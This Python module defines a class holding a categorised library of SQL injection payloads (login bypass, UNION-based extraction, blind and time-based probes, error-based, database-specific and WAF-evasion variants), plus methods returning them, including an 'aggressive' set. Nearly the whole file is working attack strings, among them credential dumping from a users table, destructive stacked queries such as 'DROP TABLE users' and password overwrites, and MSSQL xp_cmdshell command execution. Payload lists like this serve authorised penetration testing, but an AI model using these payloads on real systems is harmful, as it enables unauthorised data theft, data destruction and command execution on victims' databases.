"""
Comprehensive SQL Injection Payloads Module
Full collection of SQL injection payloads for maximum coverage
"""

class SQLIPayloads:
    def __init__(self):
        self.payloads = self._load_all_payloads()
    
    def _load_all_payloads(self) -> dict:
        """Load all SQL injection payloads organized by type"""
        return {
            'basic': [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "' OR 1=1--",
                "' OR 1=1#",
                "' OR 1=1/*",
                "admin' --",
                "admin' #",
                "admin'/*",
                "' OR '1'='1' -- ",
                "' OR '1'='1' /*",
                "' OR '1'='1' #",
            ],
            
            'union': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT 1,2,3,4,5--",
                "' UNION SELECT * FROM users--",
                "' UNION SELECT user(),database(),version()--",
                "' UNION SELECT @@version,user(),database()--",
                "' UNION SELECT NULL,CONCAT(username,':',password) FROM users--",
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
            ],
            
            'boolean': [
                "' OR '1'='1",
                "' OR '1'='2",
                "1' AND '1'='1",
                "1' AND '1'='2",
                "' AND 1=1--",
                "' AND 1=2--",
                "1' AND 1=1--",
                "1' AND 1=2--",
                "' OR 1=1 AND 'a'='a",
                "' OR 1=2 AND 'a'='a",
            ],
            
            'time_based': [
                "'; WAITFOR DELAY '00:00:05'--",
                "'; WAITFOR DELAY '0:0:5'--",
                "'; WAITFOR DELAY '00:00:10'--",
                "' OR SLEEP(5)--",
                "' OR SLEEP(10)--",
                "'; SELECT SLEEP(5)--",
                "'; SELECT SLEEP(10)--",
                "' AND SLEEP(5)--",
                "' AND SLEEP(10)--",
                "1'; WAITFOR DELAY '00:00:05'--",
            ],
            
            'error_based': [
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--",
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT version()), 0x7e), 1)--",
                "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1)--",
                "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)--",
            ],
            
            'stacked_queries': [
                "'; DROP TABLE users--",
                "'; DELETE FROM users--",
                "'; INSERT INTO users VALUES('admin','password')--",
                "'; UPDATE users SET password='hacked' WHERE username='admin'--",
                "'; EXEC xp_cmdshell('dir')--",
                "'; EXEC xp_cmdshell('whoami')--",
            ],
            
            'second_order': [
                "admin'--",
                "admin'/*",
                "admin'#",
                "admin')--",
                "admin')/*",
                "admin')#",
                "admin'))--",
                "admin'))/*",
                "admin'))#",
            ],
            
            'blind': [
                "' AND ASCII(SUBSTRING((SELECT version()),1,1))>50--",
                "' AND ASCII(SUBSTRING((SELECT user()),1,1))>50--",
                "' AND ASCII(SUBSTRING((SELECT database()),1,1))>50--",
                "' AND LENGTH((SELECT version()))>0--",
                "' AND LENGTH((SELECT user()))>0--",
                "' AND LENGTH((SELECT database()))>0--",
            ],
            
            'mysql_specific': [
                "' OR 1=1 LIMIT 1--",
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM information_schema.tables--",
                "' UNION SELECT table_name FROM information_schema.tables--",
                "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
                "' UNION SELECT username,password FROM users--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            ],
            
            'mssql_specific': [
                "'; EXEC xp_cmdshell('dir')--",
                "'; EXEC xp_cmdshell('whoami')--",
                "'; EXEC xp_cmdshell('net user')--",
                "' UNION SELECT NULL,@@version,NULL--",
                "' UNION SELECT NULL,user_name(),NULL--",
                "' UNION SELECT NULL,db_name(),NULL--",
                "'; WAITFOR DELAY '00:00:05'--",
            ],
            
            'postgresql_specific': [
                "' UNION SELECT NULL,version(),NULL--",
                "' UNION SELECT NULL,current_user,NULL--",
                "' UNION SELECT NULL,current_database(),NULL--",
                "'; SELECT pg_sleep(5)--",
                "' AND (SELECT * FROM pg_sleep(5))--",
            ],
            
            'oracle_specific': [
                "' UNION SELECT NULL,NULL FROM dual--",
                "' UNION SELECT banner FROM v$version WHERE rownum=1--",
                "' UNION SELECT user FROM dual--",
                "' AND (SELECT * FROM (SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(65)||CHR(65),5) FROM dual))--",
            ],
            
            'advanced': [
                "' OR 1=1 LIMIT 1 OFFSET 0--",
                "' UNION SELECT NULL,NULL,NULL FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a--",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' OR IF(1=1,SLEEP(5),0)--",
                "' OR IF(1=2,SLEEP(5),0)--",
                "' AND IF(1=1,SLEEP(5),0)--",
                "' AND IF(1=2,SLEEP(5),0)--",
            ],
            
            'bypass_waf': [
                "'/**/OR/**/1=1--",
                "'/**/OR/**/1=1#",
                "'/**/OR/**/1=1/*",
                "'/**/UNION/**/SELECT/**/NULL--",
                "'/**/UNION/**/SELECT/**/NULL,NULL--",
                "' OR 1=1-- -",
                "' OR 1=1# -",
                "' OR 1=1/* -",
                "'/**/OR/**/'1'='1",
                "'/**/OR/**/'1'='1'/**/--",
                "'/**/OR/**/'1'='1'/**/#",
                "' OR '1'='1' -- -",
                "' OR '1'='1' # -",
                "' OR '1'='1' /* -",
            ],
            
            'encoded': [
                "%27%20OR%20%271%27%3D%271",
                "%27%20OR%20%271%27%3D%271%27%20--",
                "%27%20OR%20%271%27%3D%271%27%20%23",
                "%27%20UNION%20SELECT%20NULL--",
                "%27%20UNION%20SELECT%20NULL%2CNULL--",
            ],
        }
    
    def get_all_payloads(self) -> list:
        """Get all payloads as a flat list"""
        all_payloads = []
        for category, payloads in self.payloads.items():
            all_payloads.extend(payloads)
        return all_payloads
    
    def get_payloads_by_type(self, payload_type: str) -> list:
        """Get payloads by type"""
        return self.payloads.get(payload_type, [])
    
    def get_aggressive_payloads(self) -> list:
        """Get most aggressive payloads for thorough testing"""
        aggressive = []
        aggressive.extend(self.payloads['basic'])
        aggressive.extend(self.payloads['union'])
        aggressive.extend(self.payloads['error_based'])
        aggressive.extend(self.payloads['time_based'])
        aggressive.extend(self.payloads['bypass_waf'])
        return aggressive
